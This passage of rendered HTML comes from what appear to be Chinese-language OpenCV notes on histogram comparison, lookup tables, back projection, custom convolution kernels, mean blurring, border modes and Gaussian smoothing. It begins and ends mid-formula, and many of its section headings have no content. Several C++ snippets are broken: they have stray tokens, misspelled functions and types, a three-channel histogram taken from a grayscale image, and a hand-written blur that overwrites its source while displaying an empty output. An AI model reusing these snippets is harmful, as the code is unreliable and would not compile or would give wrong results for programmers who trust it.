style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.840054em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15994600000000003em;"><span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.855664em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.294336em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.983875em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mclose">)</span></span></span><span style="top:-2.9438750000000002em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width='400em' height='1.28em' viewBox='0 0 400000 1296' preserveAspectRatio='xMinYMin slice'><path d='M263,681c0.7,0,18,39.7,52,119c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120c340,-704.7,510.7,-1060.3,512,-1067c4.7,-7.3,11,-11,19,-11H40000v40H1012.3s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z M1001 80H40000v40H1012z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.25612499999999994em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.607427em;"><span class="pstrut" style="height:5em;"></span><span class="hide-tail" style="min-width:1.02em;height:3.08em;"><svg width='400em' height='3.08em' viewBox='0 0 400000 3240' preserveAspectRatio='xMinYMin slice'><path d='M473,2793c339.3,-1799.3,509.3,-2700,510,-2702c3.3,-7.3,9.3,-11,18,-11H400000v40H1017.7s-90.5,478,-276.2,1466c-185.7,988,-279.5,1483,-281.5,1485c-2,6,-10,9,-24,9c-8,0,-12,-0.7,-12,-2c0,-1.3,-5.3,-32,-16,-92c-50.7,-293.3,-119.7,-693.3,-207,-1200c0,-1.3,-5.3,8.7,-16,30c-10.7,21.3,-21.3,42.7,-32,64s-16,33,-16,33s-26,-26,-26,-26s76,-153,76,-153s77,-151,77,-151c0.7,0.7,35.7,202,105,604c67.3,400.7,102,602.7,104,606zM1001 80H400000v40H1017z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.392573em;"><span></span></span></span></span></span></span></span></span></span></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src1 = imread(<span class="string">&quot;./1.jpg&quot;</span>,IMREAD_GRAYSCALE);</span><br><span class="line">Mat src2 = imread(<span class="string">&quot;./2.jpg&quot;</span>,IMREAD_GRAYSCALE);</span><br><span class="line"><span class="keyword">int</span> histSize[] = &#123;<span class="number">256</span>,<span class="number">256</span>,<span class="number">256</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> channels[] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">Mat hist1,hist2;</span><br><span class="line"><span class="keyword">float</span> c1[] = &#123;<span class="number">0</span>,<span class="number">255</span>&#125;;</span><br><span class="line"><span class="keyword">float</span> c2[] = &#123;<span class="number">0</span>,<span class="number">255</span>&#125;;</span><br><span class="line"><span class="keyword">float</span> c3[] = &#123;<span class="number">0</span>,<span class="number">255</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">float</span> *histRanges[]=&#123;c1,c2,c3&#125;;</span><br><span class="line">calcHist(&amp;src1,<span class="number">1</span>,channels,Mat(),hist1,<span class="number">3</span>,histSize,histRanges,<span class="literal">true</span>,<span class="literal">false</span>);</span><br><span class="line">calcHist(&amp;src2,<span class="number">1</span>,channels,Mat(),hist2,<span class="number">3</span>,histSize,histRanges,<span class="literal">true</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//归一化</span></span><br><span class="line">normalize(hist1,hist1,<span class="number">0</span>,<span class="number">1.0</span>,NORM_MINMAX,<span class="number">-1</span>,Mat())l;</span><br><span class="line">normalize(hist2,hist2,<span class="number">0</span>,<span class="number">1.0</span>,NORM_MINMAX,<span class="number">-1</span>,Mat())l;</span><br><span class="line"><span class="comment">//巴氏距离</span></span><br><span class="line"><span class="keyword">double</span> h12 = compareHist(hist1,hist2,HISTCMP_BHATTACHARYYA);</span><br><span class="line"><span class="keyword">double</span> h11 = compareHist(hist1,hist1,HISTCMP_BHATTACHARYYA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f,%.2f&quot;</span>,h12,h11)</span><br></pre></td></tr></table></figure><h2 id="图像查找表与颜色表"><a class="markdownIt-Anchor" href="#图像查找表与颜色表"></a> 图像查找表与颜色表</h2><ul><li>查找表是一维或多维的数组，存储了不同输入值所对应的输出值。根据一对一或多对一的函数，定义了如何将像素转换为新的值。</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>LUT(src,lut,dst)</td><td>颜色替换</td><td></td></tr><tr><td>applyColorMap(src,dst,COLORMAP_AUTUMIN)</td><td>自带12种颜色查找表替换</td><td></td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src = imread(<span class="string">&quot;./1.jpg&quot;</span>);</span><br><span class="line">Mat color = imread(<span class="string">&quot;./lut.jpg&quot;</span>);</span><br><span class="line">Mat lut = Mar::zeros(<span class="number">256</span>,i,CV_8U3);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">  lut.at&lt;Vec3b&gt;(i,<span class="number">0</span>)=color.at&lt;Vec3b&gt;(<span class="number">10</span>,i);</span><br><span class="line">&#125;</span><br><span class="line">Mat dst;</span><br><span class="line">LUT(src,lut,dst);</span><br><span class="line">imshow(<span class="string">&quot;color&quot;</span>,color);imshow(<span class="string">&quot;dst&quot;</span>,dst);</span><br></pre></td></tr></table></figure><h2 id="线性变换"><a class="markdownIt-Anchor" href="#线性变换"></a> 线性变换</h2><h2 id="直方图正规化"><a class="markdownIt-Anchor" href="#直方图正规化"></a> 直方图正规化</h2><h2 id="伽马变换"><a class="markdownIt-Anchor" href="#伽马变换"></a> 伽马变换</h2><h2 id="全局直方图均值化"><a class="markdownIt-Anchor" href="#全局直方图均值化"></a> 全局直方图均值化</h2><h2 id="直方图反向投影"><a class="markdownIt-Anchor" href="#直方图反向投影"></a> 直方图反向投影</h2><ul><li><p>原理：如果有一个物品图1具有很明显的直方图特征，比如颜色或者明暗呈有规律的变化，就可以利用直方图特征，在目标图2中查找这个特征。</p></li><li><p>步骤：</p><ol><li>计算直方图：计算直方图采用HSV中的H和S二维空间进行转换，并归一化</li><li>计算比率：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>R</mi><mo>=</mo><mfrac><msubsup><mi>H</mi><mrow><mi>x</mi><mi mathvariant="normal">.</mi><mi>y</mi></mrow><mn>1</mn></msubsup><msubsup><mi>H</mi><mrow><mi>x</mi><mi mathvariant="normal">.</mi><mi>y</mi></mrow><mn>2</mn></msubsup></mfrac></mrow><annotation encoding="application/x-tex">R=\frac{H^1_{x.y}}{H^2_{x.y}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.8737599999999999em;vertical-align:-0.64242em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2313399999999999em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.214em;margin-left:-0.08125em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mord mtight">.</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.42488571428571426em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.60742em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.214em;margin-left:-0.08125em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mord mtight">.</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.42488571428571426em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.64242em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>目标图2肯定直方图特征较为复杂，比率结果仅在物品图直方图较高</li><li>卷积模糊：由于bin是有大小的，一般取48，直接输出会变得很尖锐，所以需要进行模糊</li><li>反向输出</li></ol></li></ul><h3 id="代码实现-2"><a class="markdownIt-Anchor" href="#代码实现-2"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat model,src;</span><br><span class="line">Mat model_hsv,src_hsv;</span><br><span class="line">cvtColor(model,model_hsv,COLOR_BGR2HSV);</span><br><span class="line">cvtColor(src,src_hsv,COLOR_BGR2HSV);</span><br><span class="line"><span class="keyword">int</span> h_bins=<span class="number">32</span>,s_bin=<span class="number">32</span>;</span><br><span class="line"><span class="keyword">int</span> histSize[]=&#123;h_bins,s_bins&#125;;</span><br><span class="line"><span class="keyword">int</span> channels[] = &#123;<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">Mat roiHist;</span><br><span class="line"><span class="keyword">float</span> h_range[]=&#123;<span class="number">0</span>,<span class="number">180</span>&#125;,s_range[]=&#123;<span class="number">0</span>,<span class="number">255</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">float</span>* ranges[]=&#123;h_range,s_range&#125;;</span><br><span class="line">calHist(&amp;model_hsv,<span class="number">1</span>,channels,Mat&#123;&#125;,roiHist,<span class="number">2</span>,histSize(),ranges,<span class="literal">true</span>,<span class="literal">false</span>);</span><br><span class="line">normalize(roiHist,roiHist,NORM_MINMAX,<span class="number">-1</span>,Mat());</span><br><span class="line">MatND backproj;</span><br><span class="line">calcBackproject(&amp;src_hsv,<span class="number">1</span>channels,roiHist,backproj,ranges,<span class="number">1.0</span>);</span><br><span class="line">imshow(<span class="string">&quot;backproject&quot;</span>,backproj);</span><br></pre></td></tr></table></figure><h2 id="限制对比度的自适应直方图均值化"><a class="markdownIt-Anchor" href="#限制对比度的自适应直方图均值化"></a> 限制对比度的自适应直方图均值化</h2><h1 id="频率域滤波"><a class="markdownIt-Anchor" href="#频率域滤波"></a> 频率域滤波</h1><h2 id="低通滤波和高通滤波"><a class="markdownIt-Anchor" href="#低通滤波和高通滤波"></a> 低通滤波和高通滤波</h2><h2 id="带通和带阻滤波"><a class="markdownIt-Anchor" href="#带通和带阻滤波"></a> 带通和带阻滤波</h2><h2 id="自定义滤波"><a class="markdownIt-Anchor" href="#自定义滤波"></a> 自定义滤波</h2><h3 id="卷积核"><a class="markdownIt-Anchor" href="#卷积核"></a> 卷积核</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//均值滤波卷积核</span></span><br><span class="line"><span class="keyword">int</span> k=<span class="number">15</span>;</span><br><span class="line">Mat meankernel = Mat::ones(k,k,CV_32F)/(<span class="keyword">float</span>)(k*k);</span><br><span class="line"><span class="comment">//自定义滤波 src,dst,depth,卷积核，锚点，提升亮度，边缘填充方式</span></span><br><span class="line">filter2D(src,dst,<span class="number">-1</span>,meankernel,Point(<span class="number">-1</span>,<span class="number">-1</span>),<span class="number">0</span>,BORDER_DEFAULT)</span><br><span class="line"><span class="comment">//非均值滤波，此时滤波后的范围是-255~255，需要改变输出的类型，提升亮度为127，检测出轮廓</span></span><br><span class="line">Mat robot = (Mat_&lt;<span class="keyword">int</span>&gt;(<span class="number">2</span>,<span class="number">2</span>)&lt;&lt;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line">filter2D(src,dst,CV_32F,robot,Point(<span class="number">-1</span>,<span class="number">-1</span>),<span class="number">127</span>,BORDER_DEFAULT);</span><br><span class="line"><span class="comment">//将正负取绝对值</span></span><br><span class="line">convertScaleAbs(dst,dst);</span><br></pre></td></tr></table></figure><h2 id="同态滤波"><a class="markdownIt-Anchor" href="#同态滤波"></a> 同态滤波</h2><h1 id="图像平滑"><a class="markdownIt-Anchor" href="#图像平滑"></a> 图像平滑</h1><h2 id="均值卷积"><a class="markdownIt-Anchor" href="#均值卷积"></a> 均值卷积</h2><h3 id="代码实现-3"><a class="markdownIt-Anchor" href="#代码实现-3"></a> 代码实现</h3><ul><li>自己实现，均值卷积，所有卷积核系数是一样的</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src = imread(<span class="string">&quot;./1.jpg&quot;</span>);</span><br><span class="line">Mat dst = Mar::zeros(src.size(),src.type());</span><br><span class="line"><span class="keyword">int</span> h = src.rows,w = src.cols;</span><br><span class="line"><span class="comment">//对于边缘不做处理</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> row=<span class="number">1</span>;row&lt;h<span class="number">-1</span>;row++)&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> col=<span class="number">1</span>;col&lt;w<span class="number">-1</span>;col++)&#123;</span><br><span class="line">    <span class="keyword">int</span> sb = src.at&lt;Vec3b&gt;(row<span class="number">-1</span>,col<span class="number">-1</span>)[<span class="number">0</span>] + src.at&lt;Vec3b&gt;(row<span class="number">-1</span>,col)[<span class="number">0</span>] + src.at&lt;Vec3b&gt;(row<span class="number">-1</span>,col+<span class="number">1</span>)[<span class="number">0</span>] +</span><br><span class="line">    src.at&lt;Vec3b&gt;(row,col<span class="number">-1</span>)[<span class="number">0</span>] + src.at&lt;Vec3b&gt;(row,col)[<span class="number">0</span>] + src.at&lt;Vec3b&gt;(row,col+<span class="number">1</span>)[<span class="number">0</span>] +</span><br><span class="line">    src.at&lt;Vec3b&gt;(row+<span class="number">1</span>,col<span class="number">-1</span>)[<span class="number">0</span>] + src.at&lt;Vec3b&gt;(row+<span class="number">1</span>,col)[<span class="number">0</span>] + src.at&lt;Vec3b&gt;(row+<span class="number">1</span>,col+<span class="number">1</span>)[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> sg = src.at&lt;Vec3b&gt;(row<span class="number">-1</span>,col<span class="number">-1</span>)[<span class="number">1</span>] + src.at&lt;Vec3b&gt;(row<span class="number">-1</span>,col)[<span class="number">1</span>] + src.at&lt;Vec3b&gt;(row<span class="number">-1</span>,col+<span class="number">1</span>)[<span class="number">1</span>] +</span><br><span class="line">    src.at&lt;Vec3b&gt;(row,col<span class="number">-1</span>)[<span class="number">1</span>] + src.at&lt;Vec3b&gt;(row,col)[<span class="number">1</span>] + src.at&lt;Vec3b&gt;(row,col+<span class="number">1</span>)[<span class="number">1</span>] +</span><br><span class="line">    src.at&lt;Vec3b&gt;(row+<span class="number">1</span>,col<span class="number">-1</span>)[<span class="number">1</span>] + src.at&lt;Vec3b&gt;(row+<span class="number">1</span>,col)[<span class="number">1</span>] + src.at&lt;Vec3b&gt;(row+<span class="number">1</span>,col+<span class="number">1</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> sr = src.at&lt;Vec3b&gt;(row<span class="number">-1</span>,col<span class="number">-1</span>)[<span class="number">2</span>] + src.at&lt;Vec3b&gt;(row<span class="number">-1</span>,col)[<span class="number">2</span>] + src.at&lt;Vec3b&gt;(row<span class="number">-1</span>,col+<span class="number">1</span>)[<span class="number">2</span>] +</span><br><span class="line">    src.at&lt;Vec3b&gt;(row,col<span class="number">-1</span>)[<span class="number">2</span>] + src.at&lt;Vec3b&gt;(row,col)[<span class="number">2</span>] + src.at&lt;Vec3b&gt;(row,col+<span class="number">1</span>)[<span class="number">2</span>] +</span><br><span class="line">    src.at&lt;Vec3b&gt;(row+<span class="number">1</span>,col<span class="number">-1</span>)[<span class="number">2</span>] + src.at&lt;Vec3b&gt;(row+<span class="number">1</span>,col)[<span class="number">2</span>] + src.at&lt;Vec3b&gt;(row+<span class="number">1</span>,col+<span class="number">1</span>)[<span class="number">2</span>];</span><br><span class="line">    src.at&lt;Vec3b&gt;(row,col)[<span class="number">0</span>]=sb/<span class="number">9</span>;</span><br><span class="line">    src.at&lt;Vec3b&gt;(row,col)[<span class="number">1</span>]=sg/<span class="number">9</span>;</span><br><span class="line">    src.at&lt;Vec3b&gt;(row,col)[<span class="number">2</span>]=sr/<span class="number">9</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">imshow(<span class="string">&quot;conv&quot;</span>,dst);</span><br></pre></td></tr></table></figure><ul><li>用opencv的函数</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src = imread(<span class="string">&quot;./1.jpg&quot;</span>);</span><br><span class="line">Mat dst;</span><br><span class="line">blur(src,dst,Size(<span class="number">3</span>,<span class="number">3</span>),Point(<span class="number">-1</span>,<span class="number">-1</span>),BORDER_DEFAULT);</span><br><span class="line">imshow(<span class="string">&quot;conv&quot;</span>,dst);</span><br><span class="line"><span class="comment">//size：核的大小</span></span><br><span class="line"><span class="comment">//Point(-1,-1)：锚定位置</span></span><br><span class="line"><span class="comment">//BORDER_DEAULT：边缘处理的方式，使用边缘填充的方式</span></span><br></pre></td></tr></table></figure><ul><li>卷积的边缘处理</li></ul><table><thead><tr><th>函数</th><th>方法</th></tr></thead><tbody><tr><td>BORDER_CONSTANT</td><td>0000/abcd/0000</td></tr><tr><td>BORDER_REPLICATE</td><td>aaaa/abcd/dddd</td></tr><tr><td>BORDER_WRAP</td><td>bcd/abcd/abc</td></tr><tr><td>BORDER_REFLECT_101</td><td>dcb/abcd/cba</td></tr><tr><td>BORDER_DEFAULT</td><td>dcb/abcd/cba</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> border = <span class="number">8</span>;</span><br><span class="line">copyMakeBorder(src,dst,border,boder,boder,border,BORDER_DEFAULT);</span><br><span class="line">copyMakeBorder(src,dst,border,boder,boder,border,BORDER_CONSTANT,SCalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>));</span><br></pre></td></tr></table></figure><ul><li>锚定位置的选择<ul><li>不同锚定位置，卷积后的图像不同。选择尽量使得奇数的卷积核，尽量使得锚定点在中心位置。</li></ul></li></ul><p><img src="/images/pasted-69.png" alt="锚定位置" /></p><h2 id="高斯平滑"><a class="markdownIt-Anchor" href="#高斯平滑"></a> 高斯平滑</h2><h2 id="均值平滑"><a class="markdownIt-Anchor" href="#均值平滑"></a> 均值平滑</h2><h2 id="中值平滑"><a class="markdownIt-Anchor" href="#中值平滑"></a> 中值平滑</h2><h2 id="双边滤波"><a class="markdownIt-Anchor" href="#双边滤波"></a> 双边滤波</h2><h2 id="联合双边滤波"><a class="markdownIt-Anchor" href="#联合双边滤波"></a> 联合双边滤波</h2><h2 id="导向滤波"><a class="markdownIt-Anchor" href="#导向滤波"></a> 导向滤波</h2><h1 id="图像模糊"><a class="markdownIt-Anchor" href="#图像模糊"></a> 图像模糊</h1><h2 id="高斯模糊"><a class="markdownIt-Anchor" href="#高斯模糊"></a> 高斯模糊</h2><ul><li>一阶高斯函数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>e</mi><mrow><mo>−</mo><mfrac><msup><mi>x</mi><mn>2</mn></msup><mrow><mn>2</mn><msup><mi>δ</mi><mn>2</mn></msup></mrow></mfrac></mrow></msup></mrow><annotation encoding="application/x-tex">f(x)=e^{-\frac{x^2}{2\delta^2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.24644em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.24644em;"><span style="top:-3.4534200000000004em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1328857142857145em;"><span style="top:-2.5061857142857145em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03785em;">δ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9384399999999999em;"><span style="top:-2.93844em;margin-right:0.1em;"><span class="pstrut" style="height:2.64444em;"></span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.04844em;"><span style="top:-3.04844em;margin-right:0.1em;"><span class="pstrut" style="height:2.64444em;"></span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.49381428571428565em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span></span></span></span></li><li>二阶高斯函数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>e</mi><mrow><mo>−</mo><mfrac><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup></mrow><mrow><mn>2</mn><msup><mi>δ</mi><mn>2</mn></msup></mrow></mfrac></mrow></msup></mrow><annotation encoding="application/x-tex">f(x,y)=e^{-\frac{x^2+y^2}{2\delta^2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.3013099999999997em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.3013099999999997em;"><span style="top:-3.4534200000000004em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2112714285714286em;"><span 